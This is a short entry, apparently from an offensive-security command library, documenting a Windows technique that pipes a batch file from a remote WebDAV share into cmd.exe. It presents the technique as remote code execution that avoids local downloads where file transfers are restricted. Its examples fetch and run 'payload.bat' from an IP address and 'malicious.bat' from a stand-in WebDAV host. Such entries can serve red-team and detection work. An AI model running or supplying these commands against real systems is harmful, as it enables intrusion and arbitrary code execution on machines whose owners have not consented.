---
id: fd75fd8e-8d0a-41c9-b9a2-6488c21bb0d9
name: cmd-execute-webdav-batch-file
type: command
executor: cmd
data: cmd.exe /k < \\webdavserver\folder\batchfile.bat
output: null
created_at: '2023-04-06T03:56:26.808127+00:00'
updated_at: '2023-04-10T20:37:09.257988+00:00'
platforms:
  - Windows
tags:
  - webdav
  - execution
  - remote-copy
verified: true
validated: true
---

# cmd-execute-webdav-batch-file

## Command

```cmd
cmd.exe /k < $_WEBDAV_PATH
```

## Description

This command launches a new instance of cmd.exe and executes a batch file located on a remote WebDAV server by redirecting standard input from the UNC path. It is used for remote code execution without downloading the file locally first, useful in scenarios where direct file transfers are restricted.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /k | Keeps the command window open after execution (use /c to close after) | No |
| < $_WEBDAV_PATH | UNC path to the batch file on WebDAV server (e.g., \\server\share\file.bat) | Yes |

## Examples

### Basic Usage

```cmd
cmd.exe /k < \\192.168.1.100\davshare\payload.bat
```

### Advanced Usage

```cmd
cmd.exe /k < \\webdav.example.com\public\malicious.bat && echo Execution complete
```

## Expected Output

The output depends on the batch file contents. For a simple echo batch:

```
Batch file executed successfully.
Microsoft Windows [Version 10.0.19041.264]
(c) Microsoft Corporation. All rights reserved.

C:\Users\User> 
```

The prompt remains open (/k flag), allowing further interaction. Look for any printed messages, file creations, or network connections initiated by the batch.

## Related

- [[procedures/WebDAV-Batch-File-Execution-via-Cmd]]
- [[Remote File Copy]]
